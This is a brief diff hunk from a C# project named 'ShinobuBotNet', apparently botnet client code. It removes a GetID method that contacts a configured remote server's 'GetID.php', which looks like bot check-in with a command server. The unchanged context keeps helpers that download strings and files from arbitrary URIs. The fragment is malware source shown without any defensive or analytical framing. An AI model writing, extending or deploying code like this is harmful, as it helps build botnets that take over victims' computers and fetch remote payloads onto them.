@@ -17,14 +17,6 @@ namespace ShinobuBotNet
             return wc.DownloadString(URI);
         }
 
-        public static string GetID()
-        {
-            WebClient wc = new WebClient();
-            wc.Proxy = null;
-            string result = wc.DownloadString(configs.server + "GetID.php");
-            return result;
-        }
-
         public static string DownloadFile(string URI)
         {
             string file_name = Path.GetFileName(URI);
